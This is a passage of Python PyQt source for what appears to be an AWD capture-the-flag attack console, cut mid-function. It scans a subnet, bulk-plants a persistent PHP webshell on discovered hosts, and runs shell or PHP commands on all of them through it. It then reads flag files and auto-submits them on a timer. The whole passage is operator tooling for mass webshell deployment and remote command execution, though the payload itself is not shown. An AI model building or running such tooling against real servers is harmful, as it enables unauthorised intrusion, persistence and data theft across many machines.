        auto_card, auto_body = self._card(
            '自动轮次', '按固定间隔自动取 flag 并提交；默认只提交变化的 flag，连续失败会自动熔断')
        auto_row = QHBoxLayout()
        auto_row.setSpacing(10)
        auto_row.addWidget(QLabel('轮次间隔'))
        self.sp_round = QSpinBox()
        self.sp_round.setRange(30, 3600)
        self.sp_round.setValue(int(config.轮次秒数))
        self.sp_round.setSuffix(' 秒')
        self.sp_round.setFixedWidth(110)
        auto_row.addWidget(self.sp_round)
        self.chk_changed = QCheckBox('只提交变化的 flag')
        self.chk_changed.setChecked(True)
        auto_row.addWidget(self.chk_changed)
        self.btn_auto_start = QPushButton('开始自动轮次')
        self.btn_auto_start.setObjectName('Primary')
        self.btn_auto_start.setCursor(Qt.PointingHandCursor)
        self.btn_auto_start.clicked.connect(self.on_auto_start)
        auto_row.addWidget(self.btn_auto_start)
        self.btn_auto_stop = QPushButton('停止自动')
        self.btn_auto_stop.setObjectName('Ghost')
        self.btn_auto_stop.setCursor(Qt.PointingHandCursor)
        self.btn_auto_stop.clicked.connect(self.on_auto_stop)
        self.btn_auto_stop.setEnabled(False)
        auto_row.addWidget(self.btn_auto_stop)
        auto_row.addStretch(1)
        self.lbl_countdown = QLabel('未启动')
        self.lbl_countdown.setObjectName('Status')
        auto_row.addWidget(self.lbl_countdown)
        auto_body.addLayout(auto_row)
        self._submit_btns.append(self.btn_auto_start)
        self._submit_btns.append(self.btn_auto_stop)
        outer.addWidget(auto_card)
        return self._wrap_scroll(page)

    # ---------------- 页面 4：命令 ----------------
    def _page_command(self):
        card, body = self._card(
            '④ 命令', '在所有目标上批量执行命令或 PHP 代码：信息收集、找 flag、'
                      '查杀 webshell、健康巡检都靠它')
        grid = QGridLayout()
        grid.setHorizontalSpacing(14)
        grid.setVerticalSpacing(6)
        grid.setColumnStretch(1, 1)
        self.cb_cmd_mode = QComboBox()
        self.cb_cmd_mode.addItems(['Shell 命令', 'PHP 代码'])
        grid.addWidget(QLabel('执行方式'), 0, 0)
        grid.addWidget(self.cb_cmd_mode, 0, 1)
        self.cb_preset = QComboBox()
        self.cb_preset.addItems([name for name, _ in PRESETS])
        self.cb_preset.currentIndexChanged.connect(self._on_preset)
        grid.addWidget(QLabel('预设'), 0, 2)
        grid.addWidget(self.cb_preset, 0, 3)
        body.addLayout(grid)

        self.txt_cmd = self._mono_edit(120)
        self.txt_cmd.setPlainText('id')
        body.addWidget(self.txt_cmd, 1)
        hint = QLabel('Shell 命令会包在 system() 里执行；PHP 代码不要带 <?php ?>，'
                      '直接写语句，例如 echo file_get_contents("/flag");')
        hint.setObjectName('Hint')
        hint.setWordWrap(True)
        body.addWidget(hint)

        btns, self._command_btns = self._row_buttons(
            ('执行全部', self.on_command, True),
            ('健康巡检', self.on_health, False),
            ('防守体检', self.on_defense, False),
            ('导出结果', self.on_command_export, False),
            ('清空结果', lambda: self._fill_table(self.tbl_cmd, []), False),
        )
        body.addLayout(btns)

        self.tbl_cmd = self._table(ROW_HEADERS['command'], 1)
        self.tbl_cmd.setMinimumHeight(120)
        body.addWidget(self.tbl_cmd, 1)
        return self._wrap_scroll(card)

    # ---------------- 页面 5：状态 ----------------
    def _page_status(self):
        card, body = self._card(
            '目标状态', '存活 / 写马 / 最后 flag / flag 路径一览；任务结束后自动刷新')
        row = QHBoxLayout()
        row.setSpacing(8)
        hint = QLabel('flag 路径来自上一轮取 flag 的命中缓存，下一轮会优先尝试')
        hint.setObjectName('Hint')
        hint.setWordWrap(True)
        row.addWidget(hint, 1)
        btn_refresh = QPushButton('刷新')
        btn_refresh.setObjectName('Ghost')
        btn_refresh.setCursor(Qt.PointingHandCursor)
        btn_refresh.clicked.connect(self.on_inv_refresh)
        row.addWidget(btn_refresh)
        btn_export = QPushButton('导出 CSV')
        btn_export.setObjectName('Ghost')
        btn_export.setCursor(Qt.PointingHandCursor)
        btn_export.clicked.connect(self.on_inv_export)
        row.addWidget(btn_export)
        body.addLayout(row)

        self.tbl_inventory = self._table(
            ['IP', '存活', '已写马', '已提交', '最后 flag / 路径'], 4)
        self.tbl_inventory.setMinimumHeight(180)
        body.addWidget(self.tbl_inventory, 1)
        self._inv_btns = [btn_refresh, btn_export]
        return self._wrap_scroll(card)

    # ---------------- 页面 6：设置 ----------------
    def _page_settings(self):
        page = QWidget()
        outer = QVBoxLayout(page)
        outer.setContentsMargins(0, 0, 0, 0)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.NoFrame)
        holder = QWidget()
        lay = QVBoxLayout(holder)
        lay.setContentsMargins(0, 0, 6, 0)
        lay.setSpacing(10)

        # 不死马路径与文件
        card, body = self._card('不死马路径与文件', '路径要和目标站点的 web 根目录一致')
        self.st_busima_path = QLineEdit(str(config.不死马路径))
        self.st_run_path = QLineEdit(str(config.运行的不死马路径))
        self.st_trojan = QLineEdit(str(config.木马文件名))
        body.addLayout(self._field('写入绝对路径', self.st_busima_path))
        body.addLayout(self._field('访问相对路径', self.st_run_path))
        body.addLayout(self._field('木马文件名', self.st_trojan))
        tip = QLabel('示例：/var/www/html/upload/.data.php 与 upload/.data.php')
        tip.setObjectName('Hint')
        tip.setWordWrap(True)
        body.addWidget(tip)
        lay.addWidget(card)

        # 木马校验
        card2, body2 = self._card('木马校验', 'pass 的 md5 会由「载入默认代码」自动生成')
        self.st_passcode = QLineEdit(str(config.木马的pass密码))
        self.st_cmdparam = QLineEdit(str(config.木马密码))
        body2.addLayout(self._field('pass 密码', self.st_passcode))
        body2.addLayout(self._field('命令参数名', self.st_cmdparam))
        tip2 = QLabel('命令参数名是落地木马执行 PHP 代码用的 POST 参数（默认 a）')
        tip2.setObjectName('Hint')
        tip2.setWordWrap(True)
        body2.addWidget(tip2)
        lay.addWidget(card2)

        # 网络
        card3, body3 = self._card('网络', '并发过大可能被目标限流；提交并发别超过平台限制')
        self.st_timeout = QLineEdit(str(config.请求超时))
        self.st_scantimeout = QLineEdit(str(config.扫描超时))
        self.st_workers = QLineEdit(str(config.并发数))
        self.st_task_workers = QLineEdit(str(config.任务并发))
        self.st_submit_workers = QLineEdit(str(config.提交并发))
        self.st_interval = QLineEdit(str(config.提交间隔))
        self.st_port = QLineEdit(str(config.目标端口))
        body3.addLayout(self._field('请求超时(s)', self.st_timeout))
        body3.addLayout(self._field('扫描超时(s)', self.st_scantimeout))
        body3.addLayout(self._field('扫描并发', self.st_workers))
        body3.addLayout(self._field('任务并发', self.st_task_workers))
        body3.addLayout(self._field('提交并发', self.st_submit_workers))
        body3.addLayout(self._field('提交间隔(s)', self.st_interval))
        body3.addLayout(self._field('目标端口', self.st_port))
        lay.addWidget(card3)

        # 提交判定与界面
        card4, body4 = self._card('提交判定与界面', '留空则按 JSON code 判断；仍判不出就记「未知」，不算成功')
        self.st_okword = QLineEdit(str(config.成功关键字))
        body4.addLayout(self._field('成功关键字', self.st_okword))
        self.chk_dedup = QCheckBox('重复 flag 只提交一次（平台按 flag 计分时再开）')
        self.chk_dedup.setToolTip('开启后，其他目标已提交过的相同 flag 会跳过；默认关闭')
        body4.addWidget(self.chk_dedup)
        self.cb_scheme = QComboBox()
        self.cb_scheme.addItems(['自动', 'HTTP', 'HTTPS'])
        body4.addLayout(self._field('提交协议', self.cb_scheme))
        self.st_font = QLineEdit(str(config.界面字号))
        body4.addLayout(self._field('界面字号', self.st_font))
        self.cb_theme = QComboBox()
        self.cb_theme.addItems(['浅色（粉彩）', '深色'])
        self.cb_theme.setCurrentIndex(1 if self._theme == 'dark' else 0)
        body4.addLayout(self._field('主题', self.cb_theme))
        lay.addWidget(card4)

        lay.addStretch(1)
        scroll.setWidget(holder)
        outer.addWidget(scroll, 1)

        bar = QHBoxLayout()
        btns, self._settings_btns = self._row_buttons(
            ('保存设置', self.on_save_settings, True),
            ('恢复默认', self.on_reset_settings, False),
            ('打开设置文件', self.on_open_settings_file, False),
        )
        bar.addLayout(btns)
        bar.addStretch(1)
        outer.addLayout(bar)
        return page

    # ---------------- 主题 / 日志 / 状态 ----------------
    def _apply_theme(self):
        pal = dict(PALETTES[self._theme])
        font = self._clamp_font(self._ui_font)
        pal['ui_font'] = font
        pal['mono_font'] = max(10, font - 1)
        self.setStyleSheet(build_qss(pal))

    def on_toggle_theme(self):
        self._theme = 'dark' if self._theme == 'light' else 'light'
        self._apply_theme()
        self.btn_theme.setText('切换浅色' if self._theme == 'dark' else '切换深色')
        if hasattr(self, 'cb_theme'):
            self.cb_theme.setCurrentIndex(1 if self._theme == 'dark' else 0)
        self.update()
        self.log('[界面] 已切换到%s主题' % ('深色' if self._theme == 'dark' else '浅色'), 'info')

    @staticmethod
    def _clamp_font(value):
        try:
            return max(11, min(18, int(value)))
        except (TypeError, ValueError):
            return 13

    def _set_log_size(self, delta=0, font=None):
        sizes = self.splitter.sizes()
        total = sum(sizes) or 1
        if delta:
            log_h = max(150, min(sizes[1] + delta, max(total - 200, 150)))
            self.splitter.setSizes([max(total - log_h, 140), log_h])
        if font is not None:
            self._ui_font = self._clamp_font(font)
            config.界面字号 = self._ui_font
            self._apply_theme()

    def on_log_bigger(self):
        self._set_log_size(delta=90)

    def on_log_smaller(self):
        self._set_log_size(delta=-90)

    def log(self, text, level='muted'):
        text = str(text)
        stamp = time.strftime('%H:%M:%S')
        color = LEVEL_COLOR[self._theme].get(level, PALETTES[self._theme]['log_text'])
        self.txt_log.appendHtml('<span style="color:%s">[%s] %s</span>' % (
            color, stamp, html.escape(text)))
        bar = self.txt_log.verticalScrollBar()
        bar.setValue(bar.maximum())
        if self._log_file:
            try:
                self._log_file.write('[%s] %s %s\n' % (
                    time.strftime('%Y-%m-%d %H:%M:%S'), level, text))
                self._log_file.flush()
            except (OSError, ValueError):
                pass

    def set_status(self, text):
        self.lbl_status.setText(text)

    def set_progress(self, done, total):
        self.progress.setMaximum(max(total, 1))
        self.progress.setValue(done)
        self.progress.setFormat('%d / %d' % (done, total))

    def _update_chips(self):
        keys = {core.target_key(t) for t in self._targets}
        self.chips['targets'].setText(str(len(self._targets)))
        self.chips['alive'].setText(str(len(self._alive & keys)))
        self.chips['written'].setText(str(len(self._written)))
        self.chips['flags'].setText(str(len(self._last_flag)))
        self.chips['submitted'].setText(str(len(self._submitted)))
        self.lbl_alive.setText('目标 %d 台' % len(self._targets))
        self._refresh_inventory()

    def _inventory_rows(self):
        rows = []
        for target in sorted(self._targets, key=core.ip_sort_key):
            key = core.target_key(target)
            rows.append((
                key,
                '存活' if key in self._alive else '—',
                '是' if key in self._written else '—',
                '成功' if key in self._submitted else '—',
                self._last_flag.get(key, ''),
                self._flag_path.get(key, ''),
            ))
        return rows

    def _refresh_inventory(self):
        table = getattr(self, 'tbl_inventory', None)
        if table is None:
            return
        rows = []
        for key, alive, written, submitted, flag, path in self._inventory_rows():
            cell = flag
            if path:
                cell = (flag + '\n' + path) if flag else path
            rows.append((key, alive, written, submitted, cell))
        self._fill_table(table, rows)

    def on_inv_refresh(self):
        self._refresh_inventory()
        self.log('[状态] 已刷新 %d 台目标' % len(self._targets), 'info')

    def on_inv_export(self):
        rows = self._inventory_rows()
        if not rows:
            self.log('[状态] 没有可导出的目标', 'info')
            return
        self._export_csv(rows, ['ip', 'alive', 'written', 'submitted',
                                'last_flag', 'flag_path'], 'awd_inventory.csv')

    def _open_log_file(self):
        try:
            config.ensure_dirs()
            path = os.path.join(config.日志目录,
                                'awd-%s.log' % time.strftime('%Y%m%d'))
            self._log_file = open(path, 'a', encoding='utf-8')
            self.log('[日志] 运行日志写入 %s' % path, 'info')
        except OSError:
            self._log_file = None

    def _load_state(self):
        data = config.load_state()
        for key, attr in (('last_flag', '_last_flag'),
                          ('submitted', '_submitted'),
                          ('flag_path', '_flag_path')):
            value = data.get(key)
            if isinstance(value, dict):
                setattr(self, attr,
                        {str(k): str(v) for k, v in value.items()})
        alive = data.get('alive')
        if isinstance(alive, list):
            self._alive = {str(x) for x in alive}
        written = data.get('written')
        if isinstance(written, list):
            self._written = {str(x) for x in written}

    def _save_state(self):
        try:
            config.save_state({
                'last_flag': self._last_flag,
                'submitted': self._submitted,
                'flag_path': self._flag_path,
                'alive': sorted(self._alive),
                'written': sorted(self._written),
            })
        except (TypeError, ValueError):
            pass

    # ---------------- 目标列表 ----------------
    def _targets_from_text(self, text=None):
        text = self.txt_ips.toPlainText() if text is None else text
        targets, bad = core.parse_targets_text(text)
        if bad:
            self.log('[目标] 忽略无法解析的行：%s' % ' | '.join(bad[:5]), 'fail')
        return targets

    def _load_targets(self):
        try:
            with open(config.IP文件, 'r', encoding='utf-8') as f:
                content = f.read()
        except OSError:
            content = ''
        self.txt_ips.setPlainText(content)
        self._targets = self._targets_from_text(content)
        self._update_chips()

    def _write_target_file(self, targets):
        try:
            with open(config.IP文件, 'w', encoding='utf-8') as f:
                f.write('\n'.join(t.line for t in targets))
            return True
        except OSError as exc:
            self.log('[目标] 保存失败：%s' % exc, 'fail')
            return False

    def on_save_list(self):
        targets = self._targets_from_text()
        self._targets = targets
        if self._write_target_file(targets):
            self.txt_ips.setPlainText('\n'.join(t.line for t in targets))
            self.log('[目标] 已保存 %d 台到 ip.txt' % len(targets), 'ok')
        self._update_chips()

    def on_reload_list(self):
        self._load_targets()
        self.log('[目标] 已从 ip.txt 重新载入 %d 台' % len(self._targets), 'info')

    def on_clear_list(self):
        self.txt_ips.clear()
        self._targets = []
        self._update_chips()

    def on_import_list(self):
        path, _ = QFileDialog.getOpenFileName(
            self, '导入 IP 列表', '', '文本文件 (*.txt);;所有文件 (*)')
        if not path:
            return
        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read()
        except OSError as exc:
            self.log('[目标] 导入失败：%s' % exc, 'fail')
            return
        self.txt_ips.setPlainText(content)
        self.on_save_list()

    def on_export_list(self):
        path, _ = QFileDialog.getSaveFileName(
            self, '导出 IP 列表', 'ip.txt', '文本文件 (*.txt)')
        if not path:
            return
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(t.line for t in self._targets_from_text()))
        except OSError as exc:
            self.log('[目标] 导出失败：%s' % exc, 'fail')
            return
        self.log('[目标] 已导出到 %s' % path, 'ok')

    # ---------------- 任务调度 ----------------
    def _busy(self, flag):
        for btn in getattr(self, '_all_btns', []):
            btn.setEnabled(not flag)
        self.btn_stop.setEnabled(flag)
        self.btn_theme.setEnabled(not flag)
        if hasattr(self, 'btn_auto_stop'):
            self.btn_auto_stop.setEnabled(bool(self._auto_on))
        if hasattr(self, 'btn_auto_start'):
            self.btn_auto_start.setEnabled(not flag and not self._auto_on)

    def _collect_buttons(self):
        btns = []
        for group in (self._target_btns, self._write_btns, self._submit_btns,
                      self._command_btns, self._inv_btns, self._settings_btns):
            btns.extend(group)
        # 去重，避免同一个按钮被禁用/启用两次
        seen, unique = set(), []
        for btn in btns:
            if id(btn) not in seen:
                seen.add(id(btn))
                unique.append(btn)
        self._all_btns = unique

    def _start(self, kind, work):
        if self._thread is not None or self._running:
            self.log('[任务] 已有任务在运行，请先停止或等待完成', 'fail')
            return False
        self._running = True
        self._stop = False
        self._breaker = False
        self._collect_buttons()
        self._busy(True)
        thread = TaskThread(kind, work)
        thread.sig_log.connect(self.log)
        thread.sig_progress.connect(self.set_progress)
        thread.sig_done.connect(self._on_done)
        thread.sig_rows.connect(self._show_rows)
        thread.sig_ips.connect(self._on_scan_done)
        thread.sig_paths.connect(self._merge_flag_paths)
        thread.sig_report.connect(self._show_report)
        thread.sig_alive.connect(self._on_alive_done)
        thread.sig_responses.connect(self._merge_responses)
        thread.finished.connect(lambda t=thread: self._on_thread_finished(t))
        self._thread = thread
        thread.start()
        return True

    def _on_thread_finished(self, thread):
        if self._thread is thread:
            self._thread = None
            self._running = False
        if hasattr(self, 'btn_auto_start') and not self._auto_on:
            self.btn_auto_start.setEnabled(True)
        thread.deleteLater()

    def _emit_rows(self, thread, rows, kind):
        self._rows[kind] = list(rows)
        thread.sig_rows.emit(rows, kind)

    def _merge_flag_paths(self, paths):
        """把本轮命中的 flag 路径缓存起来，下一轮原生读取时优先尝试"""
        if not isinstance(paths, dict):
            return
        for key, path in paths.items():
            if path:
                self._flag_path[str(key)] = str(path)

    def _merge_responses(self, responses):
        """保存本轮每台目标最后一次提交的完整响应，供「查看响应」按钮使用"""
        if isinstance(responses, dict):
            self._responses.update(responses)

    def _show_rows(self, rows, kind):
        table = {'write': getattr(self, 'tbl_write', None),
                 'flag': getattr(self, 'tbl_flag', None),
                 'inbox': getattr(self, 'tbl_flag', None),
                 'command': getattr(self, 'tbl_cmd', None)}.get(kind)
        if table is not None:
            self._fill_table(table, rows)
        if kind == 'write':
            for row in rows:
                if str(row[1]).startswith('成功'):
                    self._written.add(str(row[0]))
        elif kind == 'inbox':
            pass  # 手动提交不写入目标状态
        elif kind == 'flag':
            for row in rows:
                key = str(row[0])
                flag = str(row[1]) if len(row) > 1 else ''
                mark = str(row[2]) if len(row) > 2 else ''
                if flag:
                    self._last_flag[key] = flag
                if mark.startswith('成功') or mark.startswith('已提交'):
                    self._submitted[key] = flag or self._submitted.get(key, '')
        elif kind == 'command':
            for row in rows:
                if len(row) < 4:
                    continue
                status = str(row[3])
                key = str(row[0])
                if status == '存活':
                    self._alive.add(key)
                elif status == '死亡':
                    self._alive.discard(key)
        self._update_chips()

    def _on_done(self, kind, ok, fail):
        self._running = False
        self._busy(False)
        self.progress.setValue(0)
        self.progress.setFormat('')
        self.set_status('%s 完成：成功 %d，失败 %d' % (kind, ok, fail))
        self.log('[%s] 完成：成功 %d，失败 %d' % (kind, ok, fail), 'info')
        if kind == '自动提交':
            self._round_stats = '上轮 成功%d/失败%d' % (ok, fail)
            if self._auto_on:
                left = max(0, self._round_left)
                mins, secs = divmod(left, 60)
                self.lbl_countdown.setText(
                    '下一轮 %02d:%02d · %s' % (mins, secs, self._round_stats))
        if self._breaker:
            self.log('[熔断] 提交连续失败或被平台拒绝，已停止自动轮次', 'fail')
            self.on_auto_stop()
        self._save_state()

    def on_stop(self):
        self._stop = True
        self.set_status('正在停止…')
        self.log('[控制] 已请求停止当前任务', 'info')

    def _read_targets(self):
        targets = self._targets_from_text()
        self._targets = targets
        return targets

    # ---------------- 扫描 ----------------
    def on_scan(self):
        my_ip = self.ed_myip.text().strip()
        port = self.ed_port.text().strip() or '80'
        if not core.parse_ip_field(my_ip):
            self.log('[扫描] IP 地址有误：%s' % my_ip, 'fail')
            return
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            self.log('[扫描] 端口有误：%s' % port, 'fail')
            return
        config.目标端口 = port
        self._scan_port = port
        self.set_status('正在扫描网段…')
        self.log('[扫描] 开始扫描 %s 所在网段，端口 %s' % (my_ip, port), 'info')

        def work(thread):
            ips = core.scan_hosts(
                core.parse_ip_field(my_ip), my_ip,
                progress=lambda d, t: thread.sig_progress.emit(d, t),
                stop_flag=lambda: self._stop, port=port)
            thread.sig_ips.emit(ips)
            thread.sig_log.emit('[扫描] 存活 %d 台' % len(ips), 'ok')
            return len(ips), 0

        self._start('扫描', work)

    def _on_scan_done(self, ips):
        port = self._scan_port or self.ed_port.text().strip() or config.目标端口
        lines = [core.format_target(ip, port) for ip in ips]
        self.txt_ips.setPlainText('\n'.join(lines))
        self._targets, _ = core.parse_targets_text('\n'.join(lines))
        self._alive = {core.target_key(t) for t in self._targets}
        if self._write_target_file(self._targets):
            self.log('[扫描] 已写入 ip.txt（%d 台）' % len(self._targets), 'ok')
        self._update_chips()

    def _on_alive_done(self, keys):
        self._alive = {str(k) for k in keys}
        self._update_chips()

    def on_test_alive(self):
        targets = self._read_targets()
        if not targets:
            self.log('[存活] 目标列表为空', 'fail')
            return
        self.log('[存活] 测试 %d 台目标（TCP）...' % len(targets), 'info')
        self.set_status('正在测试目标存活…')

        def work(thread):
            rows, ok, fail = [], 0, 0
            alive_keys = []
            total = len(targets)
            done = 0

            def one(target):
                return core.probe_target(target, config.扫描超时)

            def on_row(row):
                nonlocal ok, fail, done
                target, result, error = row
                done += 1
                thread.sig_progress.emit(done, total)
                key = core.target_key(target)
                if error:
                    alive, detail = False, error
                else:
                    alive, detail = result
                if alive:
                    ok += 1
                    alive_keys.append(key)
                    thread.sig_log.emit('[存活] %s %s' % (key, detail), 'ok')
                else:
                    fail += 1
                    thread.sig_log.emit('[不存活] %s %s' % (key, detail), 'fail')
                rows.append((key, '存活' if alive else '不存活', detail, ''))

            core.run_batch(targets, one, workers=config.并发数,
                           stop=lambda: self._stop, on_done=on_row)
            rows.sort(key=lambda r: core.ip_sort_key(r[0]))
            thread.sig_alive.emit(sorted(alive_keys))
            self._emit_rows(thread, rows, 'alive')
            return ok, fail

        self._start('测试存活', work)

    # ---------------- 写马 ----------------
    def _write_options(self):
        return {
            'url': self.ed_url.text().strip(),
            'url_type': self.cb_type.currentText(),
            'pass_type': self.cb_pass.currentText(),
            'pass_word': self.ed_pass.text().strip(),
            'headers': core.parse_headers(self.ed_headers.text()),
            'code': self.txt_busima.toPlainText(),
        }

    def on_save_code(self):
        config.不死马代码 = self.txt_busima.toPlainText()
        self.log('[配置] 不死马代码已保存（%d 字节）' % len(config.不死马代码), 'ok')

    def on_load_default_code(self):
        self.txt_busima.setPlainText(config.busima_default())
        self.log('[配置] 已载入默认不死马代码（md5 按当前 pass 生成）', 'info')

    def _do_write(self, targets, title):
        options = self._write_options()
        if not options['url']:
            self.log('[写入] 请先填写木马 URL', 'fail')
            return
        if not targets:
            self.log('[写入] 目标列表为空', 'fail')
            return
        try:
            core.base_from_url(options['url'], targets[0])
        except ValueError as exc:
            self.log('[写入] 木马 URL 有误：%s' % exc, 'fail')
            return
        config.不死马代码 = options['code']
        self.set_status('正在批量写入不死马…')
        self.log('[写入] 目标 %d 台，并发 %d' % (len(targets), config.任务并发), 'info')
        self.log('[写入] 路径：%s；访问：%s；最终马：%s' % (
            config.不死马路径, config.运行的不死马路径, config.木马文件名), 'info')
        self.log('[写入] 入口：%s；%s；%s' % (
            options['url'], options['url_type'], options['pass_type']), 'info')

        def work(thread):
            rows, ok, fail, done = [], 0, 0, 0
            total = len(targets)

            def one(target):
                # run_batch 的 row 已经带 target，这里只返回 (ok, detail)，
                # 否则 target 会被当成 good，验证失败也会显示“成功”。
                return core.write_busima_ex(
                    core.get_session(), target, options)

            def on_row(row):
                nonlocal ok, fail, done
                target, result, error = row
                done += 1
                thread.sig_progress.emit(done, total)
                key = core.target_key(target)
                if error:
                    good, detail = False, error
                elif isinstance(result, tuple):
                    good, detail = result
                    # 兼容旧版/包装层返回的嵌套 (ok, detail)
                    if (isinstance(detail, tuple) and len(detail) == 2
                            and isinstance(detail[0], bool)):
                        good, detail = detail
                    if isinstance(detail, tuple):
                        detail = '；'.join(str(part) for part in detail)
                else:
                    good, detail = bool(result), ''
                if good:
                    ok += 1
                    rows.append((key, '成功', detail or '不死马已写入'))
                    thread.sig_log.emit('[成功] %s %s' % (key, detail or 'ok'), 'ok')
                else:
                    fail += 1
                    rows.append((key, '失败', detail or '写入或验证未通过'))
                    thread.sig_log.emit('[失败] %s %s' % (
                        key, detail or '写入或验证未通过'), 'fail')

            core.run_batch(targets, one, workers=config.任务并发,
                           stop=lambda: self._stop, on_done=on_row)
            rows.sort(key=lambda r: core.ip_sort_key(r[0]))
            self._emit_rows(thread, rows, 'write')
            return ok, fail

        self._start(title, work)

    def on_write(self):
        self._do_write(self._read_targets(), '写入')

    def on_write_one(self):
        targets = self._read_targets()
        if targets:
            self._do_write(targets[:1], '试写')

    def on_write_retry(self):
        failed = [r[0] for r in self._rows['write'] if str(r[1]) == '失败']
        if not failed:
            self.log('[写入] 没有可重试的失败项', 'info')
            return
        targets = []
        for key in failed:
            target = core.parse_target_line(key)
            if target:
                targets.append(target)
        self.log('[写入] 重试 %d 台失败目标' % len(targets), 'info')
        self._do_write(targets, '写入重试')

    # ---------------- 取 flag / 提交 ----------------
    def _submit_inputs(self):
        return {
            'raw': self.txt_request.toPlainText().strip(),
            'param': self.ed_param.text().strip(),
            'cmd': self.ed_cmd.text().strip(),
        }

    def _preview_text(self):
        """把当前报文 + 参数名解析成实际会发送的请求，不发送"""
        conf = self._submit_inputs()
        if not conf['raw']:
            raise ValueError('请先粘贴 HTTP 请求报文')
        submission = core.prepare_submission(conf['raw'])
        info = core.describe_submission(
            submission, 'flag{PREVIEW}', conf['param'] or 'flag')
        headers = '\n'.join('%s: %s' % (k, v)
                            for k, v in info['headers'].items())
        return ('METHOD: %s\nURL: %s\n\nHEADERS:\n%s\n\nBODY:\n%s'
                % (info['method'], info['url'], headers or '（无）',
                   info['body'] or '（无）'))

    def on_preview_submit(self):
        try:
            text = self._preview_text()
        except ValueError as exc:
            self.log('[预览] %s' % exc, 'fail')
            return
        dlg = QDialog(self)
        dlg.setWindowTitle('提交报文预览')
        dlg.resize(760, 520)
        lay = QVBoxLayout(dlg)
        edit = QPlainTextEdit()
        edit.setObjectName('Mono')
        edit.setReadOnly(True)
        edit.setPlainText(text)
        lay.addWidget(edit, 1)
        row = QHBoxLayout()
        row.addStretch(1)
        close = QPushButton('关闭')
        close.setObjectName('Primary')
        close.clicked.connect(dlg.accept)
        row.addWidget(close)
        lay.addLayout(row)
        dlg.exec()

    def _response_text(self, key, info):
        headers = info.get('headers') or {}
        header_text = '\n'.join('%s: %s' % (k, v)
                                for k, v in headers.items())
        body = str(info.get('text') or '')
        if len(body) > 200000:
            body = body[:200000] + '\n…（响应过长，已截断）'
        return ('目标：%s\n请求：%s %s\nHTTP：%s %s\n\n响应头：\n%s\n\n响应正文：\n%s'
                % (key, info.get('method') or '-', info.get('url') or '-',
                   info.get('status', ''), info.get('reason') or '',
                   header_text or '（无）', body or '（空）'))

    def on_view_response(self, *args):
        row = self.tbl_flag.currentRow()
        if row < 0:
            self.log('[响应] 请先在结果表选中一行', 'info')
            return
        item = self.tbl_flag.item(row, 0)
        key = item.text() if item else ''
        info = self._responses.get(key)
        if not info:
            self.log('[响应] %s 没有响应记录（未提交或已跳过）' % key, 'info')
            return
        dlg = QDialog(self)
        dlg.setWindowTitle('提交响应包 - %s' % key)
        dlg.resize(860, 620)
        lay = QVBoxLayout(dlg)
        edit = QPlainTextEdit()
        edit.setObjectName('Mono')
        edit.setReadOnly(True)
        edit.setTextInteractionFlags(
            Qt.TextSelectableByMouse | Qt.TextSelectableByKeyboard)
        edit.setPlainText(self._response_text(key, info))
        lay.addWidget(edit, 1)
        foot = QHBoxLayout()
        copy = QPushButton('复制全部')
        copy.setObjectName('Ghost')
        copy.setCursor(Qt.PointingHandCursor)

        def _copy():
            QApplication.clipboard().setText(edit.toPlainText())
            copy.setText('已复制')

        copy.clicked.connect(_copy)
        foot.addWidget(copy)
        foot.addStretch(1)
        close = QPushButton('关闭')
        close.setObjectName('Primary')
        close.clicked.connect(dlg.accept)
        foot.addWidget(close)
        lay.addLayout(foot)
        edit.setFocus()
        dlg.exec()

    def on_copy_flag(self):
        rows = sorted({idx.row() for idx in self.tbl_flag.selectedIndexes()})
        if not rows:
            cur = self.tbl_flag.currentRow()
            if cur >= 0:
                rows = [cur]
        if not rows:
            self.log('[复制] 请先在结果表选中一行', 'info')
            return
        lines = []
        for row in rows:
            cells = []
            for col in range(self.tbl_flag.columnCount()):
                item = self.tbl_flag.item(row, col)
                cells.append(item.text() if item else '')
            lines.append('\t'.join(cells))
        QApplication.clipboard().setText('\n'.join(lines))
        self.log('[复制] 已复制 %d 行结果到剪贴板' % len(rows), 'info')

    def on_copy_response_row(self, table, row):
        item = table.item(row, 0) if row >= 0 else None
        key = item.text() if item else ''
        info = self._responses.get(key)
        if not info:
            self.log('[复制] %s 没有响应记录' % key, 'info')
            return
        QApplication.clipboard().setText(self._response_text(key, info))
        self.log('[复制] 已复制 %s 的完整响应包' % key, 'info')

    def on_copy_log(self):
        QApplication.clipboard().setText(self.txt_log.toPlainText())
        self.set_status('日志已复制到剪贴板')

    def on_cell_double_clicked(self, table, row, col):
        """双击单元格打开可选中文本窗口，支持拖选任意字符复制"""
        item = table.item(row, col)
        if not item:
            return
        text = item.toolTip() or item.text()
        if not text:
            return
        header = table.horizontalHeaderItem(col)
        name = header.text() if header else '第 %d 列' % (col + 1)
        self._show_text_dialog('%s - 第 %d 行' % (name, row + 1), text)

    def _show_text_dialog(self, title, text):
        dlg = QDialog(self)
        dlg.setWindowTitle(title)
        dlg.resize(760, 520)
        lay = QVBoxLayout(dlg)
        edit = QPlainTextEdit()
        edit.setObjectName('Mono')
        edit.setReadOnly(True)
        edit.setTextInteractionFlags(
            Qt.TextSelectableByMouse | Qt.TextSelectableByKeyboard)
        edit.setPlainText(text)
        lay.addWidget(edit, 1)
        foot = QHBoxLayout()
        copy = QPushButton('复制全部')
        copy.setObjectName('Ghost')
        copy.setCursor(Qt.PointingHandCursor)

        def _copy():
            QApplication.clipboard().setText(edit.toPlainText())
            copy.setText('已复制')

        copy.clicked.connect(_copy)
        foot.addWidget(copy)
        foot.addStretch(1)
        close = QPushButton('关闭')
        close.setObjectName('Primary')
        close.clicked.connect(dlg.accept)
        foot.addWidget(close)
        lay.addLayout(foot)
        edit.setFocus()
        dlg.exec()

    def _do_fetch_submit(self, targets, title, do_submit, only_changed=False):
        conf = self._submit_inputs()
        tag = '提交' if do_submit else '取 flag'
        self._responses = {}
        submission = None
        if do_submit:
            if not conf['raw']:
                self.log('[%s] 请先粘贴 HTTP 请求报文' % tag, 'fail')
                return
            if not conf['param']:
                self.log('[%s] 请填写提交参数名' % tag, 'fail')
                return
            try:
                submission = core.prepare_submission(conf['raw'])
            except ValueError as exc:
                self.log('[%s] 报文解析失败：%s' % (tag, exc), 'fail')
                return
        if not targets:
            self.log('[%s] 目标列表为空' % tag, 'fail')
            return
        base_template = self.ed_url.text().strip()
        if base_template:
            try:
